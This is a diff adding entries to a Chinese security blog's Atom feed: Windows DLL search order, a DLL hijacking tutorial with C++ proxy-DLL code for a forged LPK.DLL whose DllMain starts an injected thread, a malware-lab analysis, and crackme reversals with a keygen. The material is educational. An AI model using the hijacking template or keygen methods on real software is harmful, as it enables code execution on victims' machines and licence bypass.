+    <published>2017-08-02T16:00:00.000Z</published>
+    <updated>2017-10-25T06:47:34.746Z</updated>
+    
+    <content type="html"><![CDATA[<p>一.dll加载顺序</p><ol><li>DLL查找路径基础</li></ol><p>&emsp;&emsp;应用程序可以通过以下方式控制一个DLL的加载路径：使用全路径加载、使用DLL重定向、使用manifest文件。如果上述三种方式均未指定，系统查找DLL的顺序将按照本部分描述的顺序进行。</p><p>&emsp;&emsp;对于以下两种情况的DLL，系统将不会查找，而是直接加载：</p><p>&emsp;&emsp;a. 对于已经加载到内存中的同名DLL，系统使用已经加载的DLL，并且忽略待加载DLL的路径。（注意对某个进程而言，系统已经加载的DLL一定是唯一的存在于某个目录下。）</p><p>&emsp;&emsp;b. 如果该DLL存在于某个Windows版本的已知DLL列表（unkown DLL）中，系统使用已知DLL的拷贝（包括已知DLL的依赖项）。已知DLL列表可以从如下注册表项看到：HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs。</p><p>&emsp;&emsp;这里有个比较坑的地方，对于有依赖项的DLL（即使使用全路径指定DLL位置），系统查找其所依赖DLL的方法是按照实际的模块名称来的，因此如果加载的DLL不在系统查找顺序目录下，那么动态加载该DLL（LoadLibrary）会返回一个”找不到模块”的错误。</p><p>2.系统标准DLL查找顺序</p><p>&emsp;&emsp;系统使用的标准DLL查找顺序依赖于是否设置了”安全DLL查找模式”（safe DLL search mode）。”安全DLL查找模式”会将用户当前目录置于查找顺序的后边。<br>“安全DLL查找模式”默认是启用的，禁用的话，可以将注册表项HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode设为0。调用SetDllDirectory函数可以禁用”安全DLL查找模式”，并修改DLL查找顺序。<br>Windows XP下，”安全DLL查找模式”默认是禁用的，需要启用该项的话，在注册表中新建一个SafeDllSearchMode子项，并赋值为1即可。”安全DLL查找模式”从Windows XP SP2开始，默认是启用的。</p><p>&emsp;&emsp;启用”安全DLL查找模式”时，查找顺序如下：</p><ul><li>a . 应用程序所在目录；<br>*<br>b. 系统目录。GetSystemDirectory返回的目录，通常是系统盘\Windows\System32；<br>c. 16位系统目录。该项只是为了向前兼容的处理，可以不考虑；<br>d. Windows目录。GetWindowsDirectory返回的目录，通常是系统盘\Windows；<br>e. 当前目录。GetCurrentDirectory返回的目录；<br>f. 环境变量PATH中所有目录。</li></ul><p>如果”安全DLL查找模式”被禁用，查找顺序如下：<br>a. 应用程序所在目录；<br>b. 当前目录。GetCurrentDirectory返回的目录；<br>c. 系统目录。GetSystemDirectory返回的目录，通常是系统盘\Windows\System32；<br>d. 16位系统目录。该项只是为了向前兼容的处理，可以不考虑；<br>e. Windows目录。GetWindowsDirectory返回的目录，通常是系统盘\Windows；<br>f. 环境变量PATH中所有目录。</p><ol><li>修改系统DLL查找顺序<br>系统使用的标准DLL查找顺序可以通过以下两种方式调整：<br>3.1 使用LOAD_WITH_ALTERED_SEARCH_PATH标志调用LoadLibraryEx函数；<br>这种方式调用LoadLibraryEx函数，需要设置lpFileName参数（绝对路径）。与标准查找策略不同的是，使用LOAD_WITH_ALTERED_SEARCH_PATH标志调用LoadLibraryEx函数的DLL查找顺序将”查找应用程序所在目录”修改为lpFileName指定的目录。<br>3.2 调用SetDllDirectory函数。<br>注意：SetDllDirectory函数在Windows XP SP1开始支持的。<br>函数SetDllDirectory在调用参数lpPathName是一个路径时，可支持修改DLL搜索路径。修改之后的搜索顺序如下：<br>a. 应用程序所在目录；<br>b. 函数SetDllDirectory参数lpPathName给定的目录；<br>c. 系统目录。GetSystemDirectory返回的目录，通常是系统盘\Windows\System32；<br>d. 16位系统目录。该项只是为了向前兼容的处理，可以不考虑；<br>e. Windows目录。GetWindowsDirectory返回的目录，通常是系统盘\Windows；<br>f. 环境变量PATH中所有目录。<br>如果lpPathName参数为空字符串，这样就会把当前目录从DLL搜索路径中去掉。<br>如果用NULL参数调用SetDllDirectory函数，可以恢复按照系统注册表的”安全DLL查找模式”来查找DLL。</li></ol><p>当然win8或者windows server 2012提供更多的可定制方法，这个可以参考MSDN上介绍。比如：SetDefaultDllDirectories、 AddDllDirectory、RemoveDllDirectory。</p><p>4.为了测试计算机系统的dll 加载顺序可以通过一个程序加载一个不存在的dll,然后用process monitor 来监控加载的行为。</p><pre><code>#include &lt;windows.h&gt;#include &lt;iostream&gt;int main(int argc, char ** argv){    using std::cout;    using std::endl;    // 随便设置一个不存在的dll名    HMODULE hMod = LoadLibrary(&quot;123.dll&quot;);    if (NULL != hMod)        FreeLibrary(hMod);    cout &lt;&lt; &quot;LoadLibrary Test&quot; &lt;&lt; endl;    return 0;}</code></pre><p>5.通过process monitor 实际测试win10 64位发现加载顺序是<br>    •  应用程序所在目录<br>    • 系统目录（首先是c:\Windows\SysWOW64；然后是c:\Windows\System）<br>    • windows目录<br>    • 当前目录<br>    • 环境变量path目录</p><p>二  dll 劫持</p><p>&emsp;&emsp;由于输入表中只包含DLL名而没有它的路径名，因此加载程序必须在磁盘上搜索DLL文件。首先会尝试从当前程序所在的目录加载DLL，如果没找到，则在Windows系统目录中查找，最后是在环境变量中列出的各个目录下查找。利用这个特点，先伪造一个系统同名的DLL，提供同样的输出表，每个输出函数转向真正的系统DLL。程序调用系统DLL时会先调用当前目录下伪造的DLL，完成相关功能后，再跳到系统DLL同名函数里执行。这个过程用个形象的词来描述就是系统DLL被劫持（hijack）了。</p><p>&emsp;&emsp;●DLL劫持的实现●<br>这一步我们的工作就是通过编程来实现一个LPK.DLL文件，它与系统目录下的LPK.DLL导出表相同，并能加载系统目录下的LPK.DLL，并且能将导出表转发到真实的LPK.DLL。可以看出我们要实现的这个DLL需求如下：</p><ul><li><p>1 、构造一个与系统目录下LPK.DLL一样的导出表；</p></li><li><p>2、加载系统目录下的LPK.DLL；</p></li><li><p>3、将导出函数转发到系统目录下的LPK.DLL上；</p></li><li><p>4、在初始化函数中加入我们要执行的代码。</p></li></ul><p>我们使用VC++来进行开发，首先是定义导出函数。核心代码如下：</p><pre><code>#pragma comment(linker, &quot;/EXPORT:LpkInitialize=_gamehacker_LpkInitialize,@1&quot;)#pragma comment(linker, &quot;/EXPORT:LpkTabbedTextOut=_gamehacker_LpkTabbedTextOut,@2&quot;)#pragma comment(linker, &quot;/EXPORT:LpkDllInitialize=_gamehacker_LpkDllInitialize,@3&quot;)#pragma comment(linker, &quot;/EXPORT:LpkDrawTextEx=_gamehacker_LpkDrawTextEx,@4&quot;)#pragma comment(linker, &quot;/EXPORT:LpkExtTextOut=_gamehacker_LpkExtTextOut,@6&quot;)#pragma comment(linker, &quot;/EXPORT:LpkGetCharacterPlacement=_gamehacker_LpkGetCharacterPlacement,@7&quot;)#pragma comment(linker, &quot;/EXPORT:LpkGetTextExtentExPoint=_gamehacker_LpkGetTextExtentExPoint,@8&quot;)#pragma comment(linker, &quot;/EXPORT:LpkPSMTextOut=_gamehacker_LpkPSMTextOut,@9&quot;)#pragma comment(linker, &quot;/EXPORT:LpkUseGDIWidthCache=_gamehacker_LpkUseGDIWidthCache,@10&quot;)#pragma comment(linker, &quot;/EXPORT:ftsWordBreak=_gamehacker_ftsWordBreak,@11&quot;)</code></pre><p>以上是导出表中的函数，LPK.DLL比较特殊，在导入表中有一项不是函数是数据，因此数据这部分要单独处理。核心代码如下：</p><pre><code>★EXTERNC void __cdecl gamehacker_LpkEditControl(void);   EXTERNC __declspec(dllexport) void (*LpkEditControl[14])() = {gamehacker_LpkEditControl};  ★</code></pre><p>LpkEditControl这个数组有14个成员，如上定义即可，后面我们还需要将真正的数据复制过来。<br>加载系统目录下的LPK.DLL。核心代码如下：<br>    ★<br>     inline BOOL WINAPI Load()<br>     {<br>      TCHAR tzPath[MAX_PATH];<br>      TCHAR tzTemp[MAX_PATH * 2];</p><pre><code>  GetSystemDirectory(tzPath, MAX_PATH);  lstrcat(tzPath, TEXT(&quot;\\lpk&quot;));  m_hModule=LoadLibrary(tzPath);    return (m_hModule != NULL);  }★</code></pre><p>在代码中可以看到，使用LoadLibrary方式加载系统目录下的LPK.DLL。加载完成后就要实现导出函数的转发了，这步是很关键的。<br>首先要获得原函数地址。核心代码如下：</p><pre><code>★ FARPROC WINAPI GetAddress(PCSTR pszProcName) {  FARPROC fpAddress;  CHAR szProcName[16];  TCHAR tzTemp[MAX_PATH];  fpAddress = GetProcAddress(m_hModule, pszProcName);    return fpAddress; }★</code></pre><p>然后将我们构造的导出函数一一转发。核心代码如下：</p><pre><code>★ALCDECL gamehacker_LpkInitialize(void){ GetAddress(&quot;LpkInitialize&quot;); __asm JMP EAX;}ALCDECL gamehacker_LpkTabbedTextOut(void){ GetAddress(&quot;LpkTabbedTextOut&quot;); __asm JMP EAX;}ALCDECL gamehacker_LpkDllInitialize(void){ GetAddress(&quot;LpkDllInitialize&quot;); __asm JMP EAX;}ALCDECL gamehacker_LpkDrawTextEx(void){ GetAddress(&quot;LpkDrawTextEx&quot;); __asm JMP EAX;}ALCDECL gamehacker_LpkEditControl(void){ GetAddress(&quot;LpkEditControl&quot;); __asm jmp DWORD ptr [EAX];}ALCDECL gamehacker_LpkExtTextOut(void){ GetAddress(&quot;LpkExtTextOut&quot;); __asm JMP EAX;}ALCDECL gamehacker_LpkGetCharacterPlacement(void){ GetAddress(&quot;LpkGetCharacterPlacement&quot;); __asm JMP EAX;}ALCDECL gamehacker_LpkGetTextExtentExPoint(void){ GetAddress(&quot;LpkGetTextExtentExPoint&quot;); __asm JMP EAX;}ALCDECL gamehacker_LpkPSMTextOut(void){ GetAddress(&quot;LpkPSMTextOut&quot;); __asm JMP EAX;}ALCDECL gamehacker_LpkUseGDIWidthCache(void){ GetAddress(&quot;LpkUseGDIWidthCache&quot;); __asm JMP EAX;}ALCDECL gamehacker_ftsWordBreak(void){ GetAddress(&quot;ftsWordBreak&quot;); __asm JMP EAX;}★</code></pre><p>转发完之后不要忘记LpkEditControl哦，要将真实数据复制过来。核心代码如下：<br>★<br> memcpy((LPVOID)(LpkEditControl+1), (LPVOID)((int*)GetAddress(“LpkEditControl”) + 1),52);<br>★<br>好了，到这里整个DLL劫持基本就算完成了，也许你要问，那我们要执行的代码写在哪里？我的方法是将其写到初始化函数中。这样当DLL被加载的时候就会执行。下面看一下DLL的入口函数吧。</p><pre><code>★BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved){ if (dwReason == DLL_PROCESS_ATTACH) {  DisableThreadLibraryCalls(hModule);  if(Load())  {     memcpy((LPVOID)(LpkEditControl+1), (LPVOID)((int*)GetAddress(&quot;LpkEditControl&quot;) + 1),52);     _beginthread(Init,NULL,NULL);  }  else   return FALSE; } else if (dwReason == DLL_PROCESS_DETACH) {  Free(); } return TRUE;}★</code></pre><p>在这个函数中我们看到，当加载系统目录下的LPK.DLL成功后，进行了LpkEditControl数组的复制，并通过_beginthread(Init,NULL,NULL);定义了初始化函数Init，而这个初始化函数是由我们控制的。<br>下面在初始化函数Init中写入测试代码如下：</p><pre><code>★void WINAPIV Init(LPVOID pParam);void WINAPIV Init(LPVOID pParam){ TCHAR tzPath[MAX_PATH]; TCHAR tzTemp[MAX_PATH * 2];  wsprintf(tzTemp, TEXT(&quot;劫持函数运行了.......&quot;), tzPath);   MessageBox(NULL, tzTemp, TEXT(&quot;gamehacker&quot;), MB_ICONSTOP); return; } ★</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;一.dll加载顺序&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;DLL查找路径基础&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&amp;emsp;&amp;emsp;应用程序可以通过以下方式控制一个DLL的加载路径：使用全路径加载、使用DLL重定向、使用manifest文件。如果上述三种方式均未指定，系统查找DLL的顺序
+      
+    
+    </summary>
+    
+      <category term="网络" scheme="http://18428381824.github.io/categories/%E7%BD%91%E7%BB%9C/"/>
+    
+    
+      <category term="网络" scheme="http://18428381824.github.io/tags/%E7%BD%91%E7%BB%9C/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>恶意代码分析第一记</title>
+    <link href="http://18428381824.github.io/2017/08/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%AC%AC%E4%B8%80%E8%AE%B0/"/>
+    <id>http://18428381824.github.io/2017/08/01/恶意代码分析第一记/</id>
+    <published>2017-07-31T16:00:00.000Z</published>
+    <updated>2017-08-01T02:06:27.377Z</updated>
+    
+    <content type="html"><![CDATA[<p>###步骤如下</p><p>1.分析样本来源于恶意代码分析实战课后题目的样本,lab3-01.exe,链接就不贴了，百度一搜就可以搜到了。</p><p>2.首先在虚拟机里准备好必要的工具，静态分析工具包括PEView,strings,(IDA),Dependency Walkler,Resource Hacker,PEID,PEexplorer等。动态分析工具包括process monitor,process explorer,ApateDNS,RegShot等。</p><p>3.首先对样本进行静态分析。</p><p>•     PEID 查壳</p><p><img src="http://i.imgur.com/4usSk9D.png" alt=""></p><p>发现是个加壳程序，估计导入表和字符串应该看不到什么有用的信息了。</p><p>• PEVIew</p><p>抱着可能有意外之喜的心态，打开Peview,查看导入表，果不其然，只有一个ExitProcess函数,</p><p>• Strings</p><p>用strings.exe程序查看字符串，发现字符串并没有被混淆，看到了很多字符串，其中vm32to64.exe看起来像是一个释放的可执行文件，后面的注册表SOFTWARE\Microsoft\Windows\CurrentVersion\Run是启动项的位置，猜测程序添加了开机自启动。还有一个网址www.practicalmalwareanalysis.com 程序应该是有联网活动。其实导入表和字符串也可以通过IDA来看，总之方法很多。</p><p><img src="http://i.imgur.com/OhjexaS.png" alt="">    </p><p><img src="http://i.imgur.com/wbTQjEZ.png" alt=""></p><p>4.动态分析<br>首先运行process monitor,process explorer,ApateDNS，regshot,等工具。然后运行样本程序，果然在ApateDNS中发现了联网活动。</p><p><img src="http://i.imgur.com/q2coLee.png" alt=""></p><p>在process monitor 中监控到了设置注册表启动的现象。注意要晓得哪些东西是系统正常的行为，即噪声，如图除了第二条其他都是噪声。在文件界面我们选择过滤创建文件和写入文件，如图发现了向vmx32to64.exe写文件的行为。此时要注意该程序的大小是否和样本的大小一致，判断是否是复制行为。</p><p><img src="http://i.imgur.com/jVOp29K.png" alt=""></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;###步骤如下&lt;/p&gt;
+&lt;p&gt;1.分析样本来源于恶意代码分析实战课后题目的样本,lab3-01.exe,链接就不贴了，百度一搜就可以搜到了。&lt;/p&gt;
+&lt;p&gt;2.首先在虚拟机里准备好必要的工具，静态分析工具包括PEView,strings,(IDA),Dependency W
+      
+    
+    </summary>
+    
+      <category term="恶意代码分析" scheme="http://18428381824.github.io/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"/>
+    
+    
+      <category term="恶意代码分析" scheme="http://18428381824.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>迷路</title>
+    <link href="http://18428381824.github.io/2017/08/01/%E8%BF%B7%E8%B7%AF/"/>
+    <id>http://18428381824.github.io/2017/08/01/迷路/</id>
+    <published>2017-07-31T16:00:00.000Z</published>
+    <updated>2017-08-01T02:06:52.003Z</updated>
+    
+    <content type="html"><![CDATA[<p>###步骤如下</p><p>1.这个题目是迄今遇到的最坑题目。话不多说，上题目。链接：<a href="http://pan.baidu.com/s/1hr5CtpU" target="_blank" rel="external">http://pan.baidu.com/s/1hr5CtpU</a> 密码：r9wi</p><p>2.首先运行题目，如下图所示，跟平常的题目没什么两样。随便输入字符串，发现弹出报错信息。咋一看，有关键字符串，好咧，这题不难，肯定可以找到关键挑战，然后问题就简单了。（太天真。。。）</p><p><img src="http://i.imgur.com/60iDg8y.png" alt=""></p><p>3  打开OD载入程序，搜索字符串，发现关键字符串，很高兴。</p><p><img src="http://i.imgur.com/J9OcWmh.png" alt=""></p><p>在字符串上方发现两个跳转都跳到失败处，猜想应该是二次验证，一个一个分析，分析第一个call crackme.00402e40 ，发现是对输入的字符串进行一系列处理，然后得到一个数值，在下面语句中发现是和0x92381221 进行比较。不等则跳转向失败，打开IDA，分析关键call ,发现0x92381221代表的十进制数2453148193刚好符合条件，心中顿感，我实在是太聪明了。</p><p><img src="http://i.imgur.com/gT8tpJM.png" alt=""></p><p>继续往下看下一个跳转，call crackme.00401DF0,发现是两个字符串比较，猜想是我们前面的字符串进行再次的运算得到一堆字符串然后比较，然后分析可得处理函数为call crackme.00401990,分析关键call 发现是把输入进行MD5运算得到的一堆字符串。沃日。。。这控制不了啊。。。然后感觉不太对，于是我尝试暴力把跳转改一下，看会出现什么情况。发现既弹出了成功，又弹出来失败，感觉不对。</p><p>4.想着对消息框下个断点，F9运行，点击工具栏的W发现，竟然出现了两个输入Input,觉得肯定玄机在此，觉得其中一个按钮一定是被隐藏了，在command 位置下断点，输入 bp ShowWindow,寻找ShowWindow函数，重新运行程序，发现运行到了用户层，alt+f9运行出来，发现前面就是ShowWindow 窗口在此下断点，删除刚刚下的user32里的断点，发现参数信息为0时，为隐藏，为1时为显现，于是更改参数值如下图所示：</p><p><img src="http://i.imgur.com/k7dqhuI.png" alt=""></p><p>复制到可执行文件，保存文件。再次运行发现果然出现了两个输入按钮。</p><p>5.修改后的程序重新加载进OD，此时发现感觉没什么思路，对获取输入字符串的函数进行下断点，在IDA中发现有GetWindowText函数，双加该函数，ctrl+x 获取其引用的位置，记下地址，在OD中ctrl+g 查找，找到该函数位置下断点，重新运行程序，输入字符串，点击左边的Input,程序运行到断点处，F8单步运行，发现下面有一个call ,F7进去看看，发现是获取字符串的长度，感觉好多Crackme都会对字符串的长度进行检查，于是对存字符串的位置下一个内存访问断点，看看是否有什么意外的惊喜，F9运行程序，发现程序到了这，IDA查看此位置的反编译结果，发现果然是对字符串的长度进行了检查，0x27u说明字符串长度为39,79，79,67,84,70,123,125刚好是题目所说的格式00CTF{},继续运行寻找返回的地方。最后回到401f96的位置，此处果然为一个调用，检查长度和格式。如果不符合返回值为0，跳到失败的位置。符合的话返回值为1，继续往下进行。</p><p><img src="http://i.imgur.com/EoKNATC.png" alt=""></p><p><img src="http://i.imgur.com/HQGVXkP.png" alt=""></p><p>6 继续往下分析，分析各个call 的作用，发现call 1.00401860 位置的call 有很大的嫌疑，里面有各种循环，猜测为算法处理过程，IDA定位此处位置分析基本确定此位置，继续向下运行，查找字符串比较的过程，发现地址为401fca的调用，是弹出错错误的位置，此处下断点，重新运行程序到这个位置，F7进去分析，同时打开IDA，定位此函数，辅助分析，果然发现了两个MessageBOXA函数。分析不同的弹框结果发现前面是一个字符串比较函数，IDA按table键定位此函数的位置。</p><p><img src="http://i.imgur.com/O2ZMscC.png" alt="">    </p><p>进去发现是一个一个进行字符的比较，比较字符串b5h760h64R867618bBwB48BrW92H4w5r  错误的话最后函数返回值为1，弹出错误对话框。</p><p>7.现在的问题就只剩下解决算法出路的问题了。IDA反编译出的代码如下</p><p><img src="http://i.imgur.com/bvyHkdm.png" alt=""></p><p>分析可知其对数字不做变换，大写字母减去65然后再进行关键操作，<br>V9=(V6+V5<em>V7)%26+((V6+V5</em>V7)%26&lt;0?0X1a:0)<br>v6在调试的时候会出现32-2-2=28，v5情况有点复杂，可能是3或者5，待会再说为什么，小写字母减去97然后进行关键操作，这样就进行了字符串的变换。<br>关于v6的问题：该数值最早是函数0041458e 的返回值，返回值为-1的时候就赋值为3，否则为原数。我用3进行测试的时候发现是错误的，那这个函数0041458e 就很有问题。<br>在此处下断点，F7进去发现是再次调用了函数41459c,继续跟进去同时观察IDA的结果，</p><p><img src="http://i.imgur.com/B0LOlTZ.png" alt=""></p><p>发现其实就是判断_mbschr((const unsigned __int8 <em>)(a3 + </em>(_DWORD *)this),a2))的结果，点击该函数进去，OD定位该位置，单步运行会发现，其实是检查输入字符串的第六位是否为0，如果为0则返回 值为0的地址，后面是字符串的地址减去该地址为5，即为v6,否则的话返回值为-1，在后面的判断中赋值为3.此为v6的具体赋值过程。</p><p><img src="http://i.imgur.com/IbfwZCz.png" alt=""></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;###步骤如下&lt;/p&gt;
+&lt;p&gt;1.这个题目是迄今遇到的最坑题目。话不多说，上题目。链接：&lt;a href=&quot;http://pan.baidu.com/s/1hr5CtpU&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://pan.baidu.com
+      
+    
+    </summary>
+    
+      <category term="逆向" scheme="http://18428381824.github.io/categories/%E9%80%86%E5%90%91/"/>
+    
+    
+      <category term="逆向" scheme="http://18428381824.github.io/tags/%E9%80%86%E5%90%91/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>一个简单的crackme</title>
+    <link href="http://18428381824.github.io/2017/08/01/%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84crackme/"/>
+    <id>http://18428381824.github.io/2017/08/01/一个简单的crackme/</id>
+    <published>2017-07-31T16:00:00.000Z</published>
+    <updated>2017-08-02T13:57:37.472Z</updated>
+    
+    <content type="html"><![CDATA[<p>###步骤如下</p><p>1  .程序链接    <a href="http://pan.baidu.com/s/1bSPUdK" target="_blank" rel="external">http://pan.baidu.com/s/1bSPUdK</a></p><p>2.这是一个vb程序，ida不能看出什么，只能靠OD了。首先打开程序查看界面以及填入name和serial后的弹出的关键字符串。</p><p>3.打开OD，定位关键字符串的位置，然后寻找关键跳转，发现是在0040258b的位置，往前看是test esi，esi 。</p><p><img src="http://i.imgur.com/zNx08T2.png" alt=""></p><p>寻找一下esi的来源，发现时00402533位置的比较字符串函数的返回值，在此处下断点，在堆栈中发现了两个字符串AKA-585235和111111，一个是我们输入的serial,另一个应该我输入的name处理后的结果，继续向上寻找这个字符串的来源。在00402523位置的函数时一个字符串连接函数，把AKA和585235连接在一起，</p><p><img src="http://i.imgur.com/L7OC3u0.png" alt=""></p><p>继续往前找585235的位置，发现在4024f4d处的函数调用以后，在堆栈中出现了585235，记下它的地址0014e3dc，</p><p><img src="http://i.imgur.com/XvyRwWc.png" alt=""></p><p>重新运行程序到004024f4的位置，在内存区设置0014e3dc位置设置内存访问断点，然后运行程序，</p><p><img src="http://i.imgur.com/6LollUw.png" alt=""></p><p>程序停在了7c84c3A1的位置，查看堆栈，发现出现了585235字符，记下它的地址008fbc80,</p><p><img src="http://i.imgur.com/xWA8wmF.png" alt=""></p><p>然后重新运行程序，停在004024f4的位置，查看内存008fbc80的内容，发现还不是585235，然后f9运行直到找到对其赋值的位置，记下此时的地址，0014db00,</p><p><img src="http://i.imgur.com/KF1WoYi.png" alt=""></p><p>然后重新运行程序到004024f4的位置，在内存区寻找这个位置发现是585235，</p><p><img src="http://i.imgur.com/SM4q3Fu.png" alt=""></p><p>继续往前找寻找它的来源，在004024c1的位置下断点，看一下此时它的数据是否有所变化，下面我的灵感来源于我对程序测试的结果，在程序中name输入123456和111111，serial都是585235，刚开始我以为这是一个固定的字符串，后来我输入1234567的时候，发现不一样了，于是我想着去找一下获取字符串长度的函数。在IDA中找到函数<strong>vbaLenBstr，记下它的地址，在OD中找到这个位置00402415，返回值eax是5，然后后面就是eax乘以0x17cfb赋给edi，然后调用rtcansivaluebstr函数，网上查资料该函数是获取第一个字符的ascii值，得到eax=0x31即ax=31,最后得到edi的值为6*0x17cfb+0x31=0x8ee13,然后程序调用</strong>vbastri4函数，即把十进制数转变为字符串即0x8ee13的十进制数位585235，转变为字符串“585235”，然后就得到这个585235，到此整个流程就很清楚了。</p><p><img src="http://i.imgur.com/s7GXTIj.png" alt=""></p><p>   4.转化为c代码为：</p><pre><code>#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;int main(){    char name[10];    int len=0,key=0;    scanf(&quot;%s&quot;,&amp;name);    len=strlen(name);    key=len*0x17cfb+name[0];    printf(&quot;AKA-&quot;);    printf(&quot;%d\n&quot;,key);    system(&quot;pause&quot;);    return 0;}</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;###步骤如下&lt;/p&gt;
+&lt;p&gt;1  .程序链接    &lt;a href=&quot;http://pan.baidu.com/s/1bSPUdK&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://pan.baidu.com/s/1bSPUdK&lt;/a&gt;&lt;/p&gt;
+      
+    
+    </summary>
+    
+      <category term="逆向" scheme="http://18428381824.github.io/categories/%E9%80%86%E5%90%91/"/>
+    
+    
+      <category term="逆向" scheme="http://18428381824.github.io/tags/%E9%80%86%E5%90%91/"/>
+    
+  </entry>
+  
+</feed>
